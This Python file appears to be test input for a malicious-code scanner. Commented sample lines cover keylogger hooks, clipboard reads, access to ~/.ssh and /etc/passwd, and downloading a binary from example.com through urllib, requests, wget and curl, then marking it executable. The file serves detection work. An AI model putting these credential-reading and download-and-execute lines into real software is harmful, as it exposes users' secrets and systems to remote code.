import os
import pyHook
import keyboard
import pynput
import pyperclip
import tkinter as tk
import clipboard
import lazagne
import win32api
import win32con
import winreg
import subprocess
import urllib.request
import requests

# Keylogger pattern
keyboard.on_press(lambda x: print(x))
keyboard.add_hotkey('a', lambda: print("Hotkey"))
pynput.keyboard.Listener(lambda x, y: print(x))
keyboard.hook(lambda x: print(x))

# Access to environment variables
os.getenv("USER")
os.environ["HOME"]

# Access to clipboard data
pyperclip.paste()
root = tk.Tk()
root.clipboard_get()
clipboard.paste()

# Browser password theft
import browserpass

# Access to .ssh directory
os.path.join(os.environ["HOME"], ".ssh")

# Access to /etc/passwd
with open("/etc/passwd", "r") as passwd_file:
    print(passwd_file.read())

# Check for base64-encoded strings
encoded_string = "SGVyZSBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nLg=="

# Use of os.popen
os.popen("ls")

# Use of os.system
os.system("ls 2>&1 > /dev/null")

# Use of subprocess with PIPE
subprocess.Popen(["ls"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Use of subprocess with DEVNULL
subprocess.run(["ls"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Use of urllib to download binary
urllib.request.urlretrieve("https://example.com/file.bin", "file.bin")

# Use of requests to download binary
response = requests.get("https://example.com/file.bin")
with open("file.bin", "wb") as f:
    f.write(response.content)

# Use of wget to download binary
subprocess.run(["wget", "https://example.com/file.bin"])

# Use of curl to download binary
subprocess.run(["curl", "-o", "file.bin", "https://example.com/file.bin"])

# Make remote binary executable
os.system("chmod +x file.bin")
os.chmod("file.bin", 0o755)
